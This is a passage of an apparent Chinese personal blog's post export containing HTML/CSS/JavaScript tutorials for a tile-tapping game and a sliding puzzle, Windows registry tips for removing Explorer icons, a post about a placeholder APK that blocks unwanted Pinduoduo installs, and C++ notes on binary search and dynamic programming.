hidden;}h2 { text-align: center;}#con { width: 100%; height: 400px; position: relative; top: -408px; /*隐藏所有格子*/ border-collapse: collapse;}/* 行 */.row { height: 100px; width: 100%;}/* 一个块 */.cell { height: 100px; width: 100px; float: left; border: rgb(54, 74, 129) 1px solid;}.black { background: black;}.btn { width: 100%; text-align: center;}.start { margin: 20px auto; width: 150px; height: 50px; border-radius: 10px; background: yellowgreen; line-height: 50px; color: #fff;} 如果以上部分你都能够理解并且对应着代码实现的话，那么我们看到的应该是一个空格子，我们设置 id 为 con 的 div 的 top 属性为 0 px: #con {top: 0px;}，这样我们就可以看见： 是不是很像别踩白块的界面了呢，我们已经成功了一大步，然后就是通过 js 来实现动态的插入黑块或白块，以及操作。 游戏初始化根据前面的 HTML 部分我们可以知道，每个 &lt;div class=\"cell\"&gt; 就代表一个白块，&lt;div class=\"cell black\"&gt; 就代表一个黑块，每点击一个黑块消失其实是删除了一个 &lt;div class=\"row\"&gt; 然后从上面添加一个新的 &lt;div class=\"row\"&gt; 所以我们首先要通过 js 来控制 &lt;div class=\"row\"&gt; 的创造和生成（记得删除在编写静态页面时候指定生成的 4 个 div.row）。具体方法如下： 删除之前写的 4 个 div.row，将 index.html 文件改为以下代码： 123456789101112131415161718192021&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\" /&gt; &lt;title&gt;别踩白块&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"css/index.css\" /&gt; &lt;/head&gt; &lt;body&gt; &lt;h2&gt;score&lt;/h2&gt; &lt;h2 id=\"score\"&gt;0&lt;/h2&gt; &lt;div id=\"main\"&gt; &lt;div id=\"con\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=\"btn\"&gt; &lt;button class=\"start\" onclick=\"start()\"&gt; 开始游戏 &lt;/button&gt; &lt;/div&gt; &lt;/body&gt; &lt;script src=\"js/index.js\"&gt;&lt;/script&gt;&lt;/html&gt; 对游戏进行初始化，在 js/index.js 文件中写入以下代码： 1234567891011121314151617181920212223242526272829303132333435363738394041// 创建div, className是其类名function creatediv(className) { var div = document.createElement('div'); div.className = className; return div;}// 创造一个&lt;div class=\"row\"&gt;并且有四个子节点&lt;div class=\"cell\"&gt;function createrow() { var con = $('con'); var row = creatediv('row'); //创建div className=row var arr = creatcell(); //定义div cell的类名,其中一个为cell black con.appendChild(row); // 添加row为con的子节点 for (var i = 0; i &lt; 4; i++) { row.appendChild(creatediv(arr[i])); //添加row的子节点 cell } if (con.firstChild == null) { con.appendChild(row); } else { con.insertBefore(row, con.firstChild); }}//删除div#con的子节点中最后那个&lt;div class=\"row\"&gt;function delrow() { var con = $('con'); if (con.childNodes.length == 6) { con.removeChild(con.lastChild); }}// 创建一个类名的数组，其中一个为cell black, 其余为cellfunction creatcell() { var temp = ['cell', 'cell', 'cell', 'cell']; var i = Math.floor(Math.random() * 4); //随机产生黑块的位置 Math.random()函数参数 0~1的随机数 temp[i] = 'cell black'; return temp;} 让黑块动起来在可以通过 js 来创造和销毁 div 后，我们就要让黑块动起来，这个时候我们就用到了之前 css 提到的设定 &lt;div id=\"con\"&gt; 隐藏了一行的 &lt;div id=\"row\"&gt;，我们通过 js 的 DOM 操作使其向下方移动，并设置定时器每 30 毫秒移动一次，这样就实现了黑块的平滑移动，在黑块移动的同时，我们要判断黑块是否已经触底，触底则游戏失败，停止调用 move()，触底后调用函数 fail() 游戏失败，具体方法如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051//让黑块动起来function move() { var con = $('con'); var top = parseInt(window.getComputedStyle(con, null)['top']); if (speed + top &gt; 0) { top = 0; } else { top += speed; } con.style.top = top + 'px'; //不断移动top值，使它动起来 over(); if (top == 0) { createrow(); con.style.top = '-102px'; delrow(); }}// 加速函数function speedup() { speed += 2; if (speed == 20) { alert('你超神了'); }}// 判断游戏是否结束function over() { var rows = con.childNodes; if (rows.length == 5 &amp;&amp; rows[rows.length - 1].pass !== 1) { fail(); } for (let i = 0; i &lt; rows.length; i++) { if (rows[i].pass1 == 1) { fail(); } }}// 游戏结束function fail() { clearInterval(clock); flag = false; confirm('你的最终得分为 ' + parseInt($('score').innerHTML)); var con = $('con'); con.innerHTML = ''; $('score').innerHTML = 0; con.style.top = '-408px';} 点击黑块事件让黑块动起来之后呢，我们就来考虑怎么判断用户有没有点击到黑块呢，同时用户若点击到黑块，我们要让所在那一行消失，那么我们需要一个 judge 方法，具体如下： 12345678910111213141516// 判断是否点击黑块、白块function judge(ev) { if ( ev.target.className.indexOf('black') == -1 &amp;&amp; ev.target.className.indexOf('cell') !== -1 ) { ev.target.parentNode.pass1 = 1; //定义属性pass，表示此行row的白块已经被点击 } if (ev.target.className.indexOf('black') !== -1) { //点击目标元素 类名中包含 black 说明是黑块 ev.target.className = 'cell'; ev.target.parentNode.pass = 1; //定义属性pass，表明此行row的黑块已经被点击 score(); }} 其实程序写到这里，几个核心的功能点都已经实现了，是不是感觉很简单呢。剩下来的就是将这些方法组合起来，组成完整的逻辑关系，在我给出的源码里添加有一个记分器记录用户分数的功能，同时设置加速方法，使黑块的移动越来越快等等。有兴趣的的同学可以尝试着添加事件按钮，使这个游戏更接近 APP 版本。 js 完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158// 工具封装// 根据id来获取元素function $(id) { return document.getElementById(id);}// 创建div, className是其类名function creatediv(className) { var div = document.createElement('div'); div.className = className; return div;}var clock = null;var state = 0;var speed = 6;var flag = false;//点击开始游戏按钮 开始游戏function start() { if (!flag) { init(); } else { alert('游戏已经开始，无须再次点击！'); }}/* * 初始化 init */function init() { flag = true; for (var i = 0; i &lt; 4; i++) { createrow(); } // 添加onclick事件 $('main').onclick = function (ev) { ev = ev || event; judge(ev); }; // 定时器 每30毫秒调用一次move() clock = window.setInterval('move()', 30);}// 判断是否点击黑块、白块function judge(ev) { if ( ev.target.className.indexOf('black') == -1 &amp;&amp; ev.target.className.indexOf('cell') !== -1 ) { ev.target.parentNode.pass1 = 1; //定义属性pass，表示此行row的白块已经被点击 } if (ev.target.className.indexOf('black') !== -1) { //点击目标元素 类名中包含 black 说明是黑块 ev.target.className = 'cell'; ev.target.parentNode.pass = 1; //定义属性pass，表明此行row的黑块已经被点击 score(); }}// 判断游戏是否结束function over() { var rows = con.childNodes; if (rows.length == 5 &amp;&amp; rows[rows.length - 1].pass !== 1) { fail(); } for (let i = 0; i &lt; rows.length; i++) { if (rows[i].pass1 == 1) { fail(); } }}// 游戏结束function fail() { clearInterval(clock); flag = false; confirm('你的最终得分为 ' + parseInt($('score').innerHTML)); var con = $('con'); con.innerHTML = ''; $('score').innerHTML = 0; con.style.top = '-408px';}// 创造一个&lt;div class=\"row\"&gt;并且有四个子节点&lt;div class=\"cell\"&gt;function createrow() { var con = $('con'); var row = creatediv('row'); //创建div className=row var arr = creatcell(); //定义div cell的类名,其中一个为cell black con.appendChild(row); // 添加row为con的子节点 for (var i = 0; i &lt; 4; i++) { row.appendChild(creatediv(arr[i])); //添加row的子节点 cell } if (con.firstChild == null) { con.appendChild(row); } else { con.insertBefore(row, con.firstChild); }}// 创建一个类名的数组，其中一个为cell black, 其余为cellfunction creatcell() { var temp = ['cell', 'cell', 'cell', 'cell']; var i = Math.floor(Math.random() * 4); //随机产生黑块的位置 Math.random()函数参数 0~1的随机数 temp[i] = 'cell black'; return temp;}//让黑块动起来function move() { var con = $('con'); var top = parseInt(window.getComputedStyle(con, null)['top']); if (speed + top &gt; 0) { top = 0; } else { top += speed; } con.style.top = top + 'px'; //不断移动top值，使它动起来 over(); if (top == 0) { createrow(); con.style.top = '-102px'; delrow(); }}// 加速函数function speedup() { speed += 2; if (speed == 20) { alert('你超神了'); }}//删除某行function delrow() { var con = $('con'); if (con.childNodes.length == 6) { con.removeChild(con.lastChild); }}// 记分function score() { var newscore = parseInt($('score').innerHTML) + 1; //分数加一 $('score').innerHTML = newscore; //修改分数 if (newscore % 10 == 0) { //当分数是10 的倍数时使用加速函数，越来越快 speedup(); }} 总结仅仅一百多行代码我们就实现了一个简单有趣的 Web 小游戏。如果你刚入门前端，相信本项目可以很好的让你理解，练习如何使用 JavaScript 操作 DOM.","categories":[],"tags":[{"name":"前端","slug":"前端","permalink":"https://czqu.net/tags/%E5%89%8D%E7%AB%AF/"}],"author":"陈子琦"},{"title":"h5拼图小游戏","slug":"release/2020-11-5-h5-ping-tu-1","date":"2020-11-05T07:00:00.000Z","updated":"2020-11-05T07:00:00.000Z","comments":true,"path":"posts/22493/","permalink":"https://czqu.net/posts/22493/","excerpt":"","text":"内容介绍1.1 学习内容本项目是基于 HTML+CSS+JavaScript 实现网页版的拼图游戏。实现过程中将用到 HTML5，CSS3 及 JavaScript 相关知识。完成这个项目，可以进一步扎实前端基础知识。 九宫格拼图相信大家都玩过了，看似简单的小游戏，但实现起来其实并不那么简单。在以前，写程序是程序员的专利，只有他们才能做出一个软件来。但是现在不同了。科技的进步和经济的发展，使得每个人都可以使用计算机。特别是 HTML5 和 CSS3 的流行，使得制作一个基本的游戏变得简单。 下面我们就来做一个九宫格拼图。它的玩法是移动空格块旁边的方块，使得它们按照方块上面标的数字顺序排好。最终的效果： 1.2 实验知识点本实验涉及以下知识点： HTML5 CSS3 JavaScript 1.3 实验环境 Vscode 1.4 适合人群本项目难度一般，适合刚学完前端基础（HTML+CSS+JavaScript）的同学作为练手项目。 1.5 代码获取附件： 1puzzle.zip 项目原理根据下面的效果图来观察思考，我们要做的就是设置一个大 DIV 用来包裹里面的小 DIV，然后在里面设置 8 个小 DIV，从 1 开始给他们编号。右边设置两个按钮，点击开始的时候开始计时，完成拼图后停止计时，并弹出一个框，提示完成了。重来按钮是当用户觉得当前有难度的时候，点击重来可以重新开始一个新的拼图，把所有方块打乱顺序，然后开始计时。 我们的重点就是当鼠标点击其中一个方块时，要判断当前方块是否可移动，如果可移动，则移动到相应的位置，如不可移动，则不做任何事。当移动完一块后，要判断是否完成拼图。 我们把那个大 DIV 想象成一个盒子，它有九个位置，从 1 开始，到 9 编号，他们的位置和编号都是不会变的。把里面的 8 个小 DIV 想象成 8 个小盒子，给他们设置 top 和 left 就可以控制他们的位置。每个小 DIV 从 1 开始到 8 编号。他们的位置是可以随意改变的。所以当小 DIV 的编号和大 DIV 的编号全部重合时，就完成了拼图。 所以重点就只有一个了。那就是如何判断是否可移动。这个也简单。我们设置一个一维数组变量，用来保存大 DIV 它里面装的小 DIV 的编号。如果大 DIV 没有小方块，也就表面它是空白块，那么就设为 0。如果当前大 DIV 有小 DIV，那就设置为小 DIV 的编号。然后再设置一个二维数组变量，用来保存大 DIV 的可移动编号。也就是保存这个大 DIV 它所有的可去的位置。比如大 DIV 编号为 2 的，它只能向 1 号，3 号，5 号这三个方向移动。又比如 5，它能向 2、4、6、8 这四个方向移动。我们循环遍历这个变量，如果对应的方向它 没有方块，也就是值为 0，那么它就可以往这个方向移动了。 环境准备1.准备相关开发工具 2.建立下面的目录结构： 1234puzzle |__puzzle.html |__puzzle.css |__puzzle.js 实现步骤1.编写布局在puzzle.html中我们有下面的代码： 123456789101112131415161718192021222324252627282930313233343536373839&lt;!DOCTYPE html&gt;&lt;html lang=\"zh-CN\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\" /&gt; &lt;title&gt;Puzzle&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"puzzle.css\" /&gt; &lt;script type=\"text/javascript\" src=\"puzzle.js\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; &lt;!--最外面的DIV，用来包含里面的结构--&gt; &lt;div id=\"game\"&gt; &lt;!--游戏区，也就是大DIV方块--&gt; &lt;div id=\"d1\" onclick=\"move(1)\"&gt;1&lt;/div&gt; &lt;!--小DIV，也就是8个小方块。当点击的时候执行move()函数，参数是显示的编号，这样我们就知道点击了那个方块--&gt; &lt;div id=\"d2\" onclick=\"move(2)\"&gt;2&lt;/div&gt; &lt;div id=\"d3\" onclick=\"move(3)\"&gt;3&lt;/div&gt; &lt;div id=\"d4\" onclick=\"move(4)\"&gt;4&lt;/div&gt; &lt;div id=\"d5\" onclick=\"move(5)\"&gt;5&lt;/div&gt; &lt;div id=\"d6\" onclick=\"move(6)\"&gt;6&lt;/div&gt; &lt;div id=\"d7\" onclick=\"move(7)\"&gt;7&lt;/div&gt; &lt;div id=\"d8\" onclick=\"move(8)\"&gt;8&lt;/div&gt; &lt;/div&gt; &lt;div id=\"control\"&gt; &lt;!--游戏控制区--&gt; &lt;p&gt; &lt;rowspan id=\"timeText\"&gt;总用时&lt;/rowspan&gt; &lt;rowspan id=\"timer\"&gt;&lt;/rowspan&gt; &lt;/p&gt; &lt;!--显示游戏时间区域--&gt; &lt;p&gt; &lt;rowspan id=\"start\" onclick=\"start()\"&gt;开始&lt;/rowspan&gt; &lt;rowspan id=\"reset\" onclick=\"reset()\"&gt;重来&lt;/rowspan&gt; &lt;/p&gt; &lt;!--显示控制按钮区域--&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 布局文件就写完了。这里为了简化逻辑，更易编写代码，我们把所有操作都封装了。只要执行 move(2)，就是点击了编号为 2 的小方块，后面的一系列操作都完成了。 2.编写样式布局写完了，现在我们为游戏编写样式，使得它更漂亮。在这一步，大家就可以自己自由发挥了，你可以写出自己的风格，让游戏更漂亮。也可以添加更多的元素来装饰你的游戏。但是注意了，游戏 DIV 的大小如果改变了，一定要记得修改 js 代码，稍后我们会详细讲解。 puzzle.css 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125* { padding: 0; margin: 0; border: 0;}/* *是通配符，给所有的元素去掉默认样式，因为有的浏览器会默认加上一些样式，这可能会给布局带来问题 */body { width: 100%; height: 100%;}/* 给body设置100%的高度和宽度，这样就会根据浏览器屏幕大小自动适配 */#container { position: relative; width: 620px; height: 450px; margin: 0 auto; margin-top: 100px; border-radius: 1px;}/* 这是包裹所有元素的DIV，给他设置620px的宽和450px的高，这个大小可以设置为更大，但是不能小，至少要能包含里面所有的元素 */#game { position: absolute; width: 450px; height: 450px; border-radius: 5px; display: inline-block; background-color: #ffe171; box-shadow: 0 0 10px #ffe171;}/* 这是游戏区的DIV，这个大小是计算出来的，取决于你的小方块的大小。这里我们设置小方块的大小为150px 150px，所以这个大小是150px*3，为450px */#game div { position: absolute; width: 149px; height: 149px; box-shadow: 1px 1px 2px #777; background-color: #20a6fa; color: white; text-align: center; font-size: 150px; line-height: 150px; cursor: pointer; -webkit-transition: 0.3s; /*浏览器前缀，兼容其他浏览器 chrome*/ -moz-transition: 0.3s; /*firefox*/ -ms-transition: 0.3s; /*ie*/ -o-transition: 0.3s; /*opera*/ transition: 0.3s;}/* 这就是小方块的大小了，定位为绝对定位，这样改变位置不会影响其他元素的位置。宽高都是149px。注意了，我们还设置了box-shadow:1px 1px 2px #777 ；它还有边框阴影，所以149px 加上边框1px，它的总宽度是150px 下面的transition：0.3s是设置过渡时间，这是css3的属性，它会让属性改变呈现过渡动画，所以当我们改变方块的位置时，它会有一个动画，我们不必自己编写动画函数，这回让你疯狂*/#game div:hover { color: #ffe171;}/*给方块设置鼠标悬停动画，当鼠标悬停在元素上面时，会用这里的属性替换上面的属性，移开后又会变为原来的，这里我们是把字体颜色改变*/#control { width: 150px; height: 450px; display: inline-block; float: right;}/*控制区，display:inline-block会让元素呈现块状元素的特性，使得可以改变大小，同时也会具有行内元素的特性，使得不会占据一行空间，float:right让元素浮动到右边*/#control rowspan { height: 25px; font-size: 20px; color: #222; margin-top: 10px;}/*设置控制区按钮的共同样式*/#start { display: inline-block; font-size: 28px; width: 100px; height: 28px; background-color: #20a6fa; color: #ffe171; text-shadow: 1px 1px 2px #ffe171; border-radius: 5px; box-shadow: 2px 2px 5px #4c98f5; text-align: center; cursor: pointer;}/*给start按钮设置属性。cursor:pointer属性让鼠标移到元素上面时会显示不同的鼠标形状，pointer是手型*/#reset { display: inline-block; font-size: 28px; width: 100px; height: 28px; background-color: #20a6fa; color: #ffe171; text-shadow: 1px 1px 2px #ffe171; /*字体阴影*/ border-radius: 5px; /*圆角属性*/ box-shadow: 2px 2px 5px #4c98f5; /*盒子阴影*/ text-align: center; /*文字居中*/ cursor: pointer;}/*给Reset按钮设置属性*/#d1 { left: 0px;}#d2 { left: 150px;}#d3 { left: 300px;}#d4 { top: 150px;}#d5 { top: 150px; left: 150px;}#d6 { top: 150px; left: 300px;}#d7 { top: 300px;}#d8 { left: 150px; top: 300px;}/*这是预先给每个小方块按照顺序排好位置*/ 好了，样式也编写好了。最后再编写一个 js 控制代码，我们的拼图就可以用了。编写样式的时候大家还是先根据我这里的来，等完成了整个游戏，了解游戏逻辑的时候你们再自己发挥想象力去更改样式，不然可能会出现未知的错误。 完成这步，打开 puzzle.html 应该能看到下面的效果了： 3.控制代码的编写puzzle.js 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160var time = 0;//保存定时时间var pause = true;//设置是否暂停标志，true表示暂停var set_timer;//设置定时函数var d = new Array(10);//保存大DIV当前装的小DIV的编号var d_direct = new Array( [0], //为了逻辑更简单，第一个元素我们不用，我们从下标1开始使用 [2, 4], //大DIV编号为1的DIV可以去的位置，比如第一块可以去2,4号位置 [1, 3, 5], [2, 6], [1, 5, 7], [2, 4, 6, 8], [3, 5, 9], [4, 8], [5, 7, 9], [6, 8]);//保存大DIV编号的可移动位置编号var d_posXY = new Array( [0], //同样，我们不使用第一个元素 [0, 0], //第一个表示left,第二个表示top，比如第一块的位置为let:0px,top:0px [150, 0], [300, 0], [0, 150], [150, 150], [300, 150], [0, 300], [150, 300], [300, 300]);//大DIV编号的位置d[1] = 1;d[2] = 2;d[3] = 3;d[4] = 4;d[5] = 5;d[6] = 6;d[7] = 7;d[8] = 8;d[9] = 0;//默认按照顺序排好，大DIV第九块没有，所以为0，我们用0表示空白块function move(id) { //移动函数，前面我们已将讲了 var i = 1; for (i = 1; i &lt; 10; ++i) { if (d[i] == id) break; } //这个for循环是找出小DIV在大DIV中的位置 var target_d = 0; //保存小DIV可以去的编号，0表示不能移动 target_d = whereCanTo(i); //用来找出小DIV可以去的位置，如果返回0，表示不能移动，如果可以移动，则返回可以去的位置编号 if (target_d != 0) { d[i] = 0; //把当前的大DIV编号设置为0，因为当前小DIV已经移走了，所以当前大DIV就没有装小DIV了 d[target_d] = id; //把目标大DIV设置为被点击的小DIV的编号 document.getElementById('d' + id).style.left = d_posXY[target_d][0] + 'px'; document.getElementById('d' + id).style.top = d_posXY[target_d][1] + 'px'; //最后设置被点击的小DIV的位置，把它移到目标大DIV的位置 } //如果target_d不为0，则表示可以移动，且target_d就是小DIV要去的大DIV的位置编号 var finish_flag = true; //设置游戏是否完成标志，true表示完成 for (var k = 1; k &lt; 9; ++k) { if (d[k] != k) { finish_flag = false; break; //如果大DIV保存的编号和它本身的编号不同，则表示还不是全部按照顺序排的，那么设置为false，跳出循环，后面不用再判断了，因为只要一个不符，就没完成游戏 } } //从1开始，把每个大DIV保存的编号遍历一下，判断是否完成 if (finish_flag == true) { if (!pause) start(); alert('congratulation'); } //如果为true，则表示游戏完成，如果当前没有暂停，则调用暂停韩式，并且弹出提示框，完成游戏。 //start()这个函数是开始，暂停一起的函数，如果暂停，调用后会开始，如果开始，则调用后会暂停}function whereCanTo(cur_div) { //判断是否可移动函数，参数是大DIV的编号，不是小DIV的编号，因为小DIV编号跟可以去哪没关系，小DIV是会动的 var j = 0; var move_flag = false; for (j = 0; j &lt; d_direct[cur_div].length; ++j) { //把所有可能去的位置循环遍历一下 if (d[d_direct[cur_div][j]] == 0) { move_flag = true; break; } //如果目标的值为0，说明目标位置没有装小DIV，则可以移动，跳出循环 } if (move_flag == true) { return d_direct[cur_div][j]; } else { return 0; } //可以移动，则返回目标位置的编号，否则返回0，表示不可移动}//定时函数，每一秒执行一次function timer() { time += 1; //一秒钟加一，单位是秒 var min = parseInt(time / 60); //把秒转换为分钟，一分钟60秒，取商就是分钟 var sec = time % 60; //取余就是秒 document.getElementById('timer').innerHTML = min + '分' + sec + '秒'; //然后把时间更新显示出来}//开始暂停函数function start() { if (pause) { document.getElementById('start').innerHTML = '暂停'; //把按钮文字设置为暂停 pause = false; //暂停表示设置为false set_timer = setInterval(timer, 1000); //启动定时 //如果当前是暂停，则开始 } else { document.getElementById('start').innerHTML = '开始'; pause = true; clearInterval(set_timer); }}//重置函数function reset() { time = 0; //把时间设置为0 random_d(); //把方块随机打乱函数 if (pause) //如果暂停，则开始计时 start();}//随机打乱方块函数，我们的思路是从第九块开始，随机生成一个数，然后他们两块对调一下function random_d() { for (var i = 9; i &gt; 1; --i) { var to = parseInt(Math.random() * (i - 1) + 1); //产生随机数，范围为1到i，不能超出范围，因为没这个id的DIV if (d[i] != 0) { document.getElementById('d' + d[i]).style.left = d_posXY[to][0] + 'px'; document.getElementById('d' + d[i]).style.top = d_posXY[to][1] + 'px'; } //把当前的DIV位置设置为随机产生的DIV的位置 if (d[to] != 0) { document.getElementById('d' + d[to]).style.left = d_posXY[i][0] + 'px'; document.getElementById('d' + d[to]).style.top = d_posXY[i][1] + 'px'; } //把随机产生的DIV的位置设置为当前的DIV的位置 var tem = d[to]; d[to] = d[i]; d[i] = tem; //然后把它们两个的DIV保存的编号对调一下 }}//初始化函数，页面加载的时候调用重置函数，重新开始window.onload = function () { reset();}; 好了，所有代码都已经编写完成了。现在点击桌面上的 puzzle.html 文件，使用 浏览器 打开，就能看到效果了。点击上面的方块就可以移动。 总结通过此项目，我们利用 HTML5 + CSS3 + JavaScript，实现了一个简单的拼图游戏。 这里说明一下，因为实验中使用的随机打乱方块的算法非常简单，但是存在 bug，有 50% 的概率生成的顺序是无法复原的，这个时候就只能点击重新开始。","categories":[],"tags":[{"name":"前端","slug":"前端","permalink":"https://czqu.net/tags/%E5%89%8D%E7%AB%AF/"}],"author":"陈子琦"},{"title":"删除Win10此电脑里的设备和驱动器中的图标","slug":"draft/Remove-ICONS-from-devices-and-drives-in-Windows-10","date":"2020-11-01T07:11:45.000Z","updated":"2020-11-01T07:11:45.000Z","comments":true,"path":"posts/39253/","permalink":"https://czqu.net/posts/39253/","excerpt":"","text":"删除Win10此电脑里的设备和驱动器中的百度云图标，同样方法还可以删除暴风影音，迅雷等。 不知从何时起，资源管理器“此电脑(Win10)/这台电脑(Win8/Win8.1)/计算机(Win7)”的“设备和驱动器”中就开始流行被植入一些第三方项目。客观上说，这些项目给经常使用这些软件的用户提供了很大便利。但有些用户则并不需要这种“便利”，因为这些项目之所以能够出现在这种位置，完全是软件自身设置的原因，并非用户有意安排。而且鉴于这种现象越来越普遍，导致某些用户“此电脑”中“设备和驱动器”项目数量十分壮观。 虽然这些软件的设置中也都有移除这些“入口”的选项，但如果这些项目过多，挨个删除未免太过麻烦。有没有什么办法能够一次性删除所有多余项目呢?答案是肯定的，在注册表中就可以实现。需要提醒各位的是，注册表操作需谨慎，最好提前进行备份，以防止误操作带来的麻烦。 具体方法如下： 1、在开始-运行输入regedit后回车 2、定位到 HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\ 如果上述的注册表为空，或者无效，则定位到HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\ 将不是系统自带的全删掉，最好右键NameSpace备份一下，以免误删 其他不在下面列表的可以一个一个删除尝试，但一定要记得备份 系统自带的参考： {1CF1260C-4DD0-4ebb-811F-33C572699FDE}–音乐{374DE290-123F-4565-9164-39C4925E467B}–下载{3ADDbai-EB32-4cb0-BBD7-DFA0ABB5ACCA}–图片{A0953C92-50DC-43bf-BE83-3742FED03C9C}–视频{A8CDFF1C-4878-43be-B5FD-F8091C1C60D0}–文档{B4BFCC3A-DB2C-424C-B029-7FE99A87C641}–桌面 {0DB7E03F-FC29-4DC6-9020-FF41B59E513A}–3D对象文件夹 3、删除该位置下的所有值，或者你认为可以删除的值(只留“默认”就可以) 这里是删HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\的内容哈，别整错了。 重新打开“此电脑”后，所有第三方项目应该都被“肃清”了。","categories":[],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://czqu.net/tags/Windows/"}]},{"title":"如何让手机点到广告的时候不会自动安装拼多多","slug":"draft/prevent-Pinduoduo","date":"2020-09-15T04:56:16.000Z","updated":"2020-09-15T04:56:16.000Z","comments":true,"path":"posts/57274/","permalink":"https://czqu.net/posts/57274/","excerpt":"","text":"今天真的很烦，打开某app，就会马上跳转到应用商店自动下载拼多多。于是乎我直接做了一个和拼多多包名一样的app，这样误点到广告的时候就不会自动安装拼多多了。原理非常简单，大佬勿喷，我不是专门做安卓的 当然有需要的童鞋也可以点下面的链接下载，没有申请任何权限，很干净。 蓝奏云下载 https://www.lanzoux.com/iZbxPgnlf3i 或者百度云链接：https://pan.baidu.com/s/17Rbrn9AXGf5knsWSZZzqqg 提取码：g77c","categories":[],"tags":[{"name":"安卓","slug":"安卓","permalink":"https://czqu.net/tags/%E5%AE%89%E5%8D%93/"}]},{"title":"算法与数据结构学习笔记：二分法","slug":"release/2020-8-9-binary-search","date":"2020-09-11T14:00:00.000Z","updated":"2020-09-11T14:00:00.000Z","comments":true,"path":"posts/59351/","permalink":"https://czqu.net/posts/59351/","excerpt":"","text":"二分搜索模板给一个有序数组和目标值，找第一次/最后一次/任何一次出现的索引，如果没有出现返回-1 模板四点要素 1、初始化：start=0、end=len-1 2、循环退出条件：start + 1 &lt; end 3、比较中点和目标值：A[mid] ==、 &lt;、&gt; target 4、判断最后两个元素是否符合：A[start]、A[end] ? target 注意：为了防止overflow，超过int范围，左中位数（a+b)=a+(b-a)/2,右中位数（a+b)=a+(b-a+1)/2如果有mid*mid,mid用int注意溢出 时间复杂度 O(logn)，使用场景一般是有序数组的查找 典型示例 704. 二分查找 给定一个 n 个元素有序的（升序）整型数组 nums 和一个目标值 target ，写一个函数搜索 nums 中的 target，如果目标值存在返回下标，否则返回 -1。 1234567891011121314151617181920212223242526class Solution {public: int search(vector&lt;int&gt;&amp; nums, int target) { int start,mid,end; start=0; end=nums.size()-1; while(start&lt;=end) { mid=start+(end-start)/2;//防止两数之和超过int范围 if(nums[mid]==target) return mid; if(nums[mid]&gt;target) { end=mid-1; } else{ start=mid+1; } } return -1; }}; 大部分二分查找类的题目都可以用这个模板，然后做一点特殊逻辑即可 另外二分查找还有一些其他模板如下文，大部分场景模板#3 都能解决问题，而且还能找第一次/最后一次出现的位置，应用更加广泛 所以用模板#3 就对了 模板 #1 (left &lt;= right) 二分查找的最基础和最基本的形式。查找条件可以在不与元素的两侧进行比较的情况下确定（或使用它周围的特定元素）。不需要后处理，因为每一步中，你都在检查是否找到了元素。如果到达末尾，则知道未找到该元素。 模板 #2 (left &lt; right) 一种实现二分查找的高级方法。查找条件需要访问元素的直接右邻居。使用元素的右邻居来确定是否满足条件，并决定是向左还是向右。保证查找空间在每一步中至少有 2 个元素。需要进行后处理。 当你剩下 1 个元素时，循环 / 递归结束。 需要评估剩余元素是否符合条件。 模板 #3 (left + 1 &lt; right) 实现二分查找的另一种方法。搜索条件需要访问元素的直接左右邻居。使用元素的邻居来确定它是向右还是向左。保证查找空间在每个步骤中至少有 3 个元素。需要进行后处理。 当剩下 2 个元素时，循环 / 递归结束。 需要评估其余元素是否符合条件。 如果是最简单的二分搜索，不需要找第一个、最后一个位置、或者是没有重复元素，可以使用模板#1，代码更简洁 总结二分搜索核心四点要素（必背&amp;理解） 1、初始化：start=0、end=len-1 2、循环退出条件：start + 1 &lt; end 3、比较中点和目标值：A[mid] ==、 &lt;、&gt; target 4、判断最后两个元素是否符合：A[start]、A[end] ? target","categories":[],"tags":[{"name":"cpp","slug":"cpp","permalink":"https://czqu.net/tags/cpp/"},{"name":"算法","slug":"算法","permalink":"https://czqu.net/tags/%E7%AE%97%E6%B3%95/"},{"name":"二分法","slug":"二分法","permalink":"https://czqu.net/tags/%E4%BA%8C%E5%88%86%E6%B3%95/"}],"author":"陈子琦"},{"title":"算法与数据结构学习笔记：动态规划","slug":"release/2020-8-9-Dynamic-Programming","date":"2020-09-11T03:40:00.000Z","updated":"2020-09-11T03:40:00.000Z","comments":true,"path":"posts/26904/","permalink":"https://czqu.net/posts/26904/","excerpt":"","text":"线性 DP最经典单串300. 最长上升子序列 给定一个无序的整数数组，找到其中最长上升子序列的长度。 示例: 输入: [10,9,2,5,3,7,101,18]输出: 4解释: 最长的上升子序列是 [2,3,7,101]，它的长度是 4。 12345678910111213141516171819class Solution {public: int lengthOfLIS(vector&lt;int&gt;&amp; nums) { int maxLength=0; vector&lt;int&gt; dp(nums.size(),1); for(int i=0;i&lt;nums.size();i++) { for(int j=0;j&lt;i;j++) { if(nums[i]&gt;nums[j]&amp;&amp;dp[i]&lt;(dp[j]+1)) { dp[i]=dp[j]+1; } } maxLength=max(maxLength,dp[i]); } return maxLength; }}; 最经典双串：1143. 最长公共子序列123456789101112131415161718192021222324252627class Solution {public: int longestCommonSubsequence(string text1, string text2) { int len1=text1.size(); int len2=text2.size(); int dp[len1+2][len2+2]; 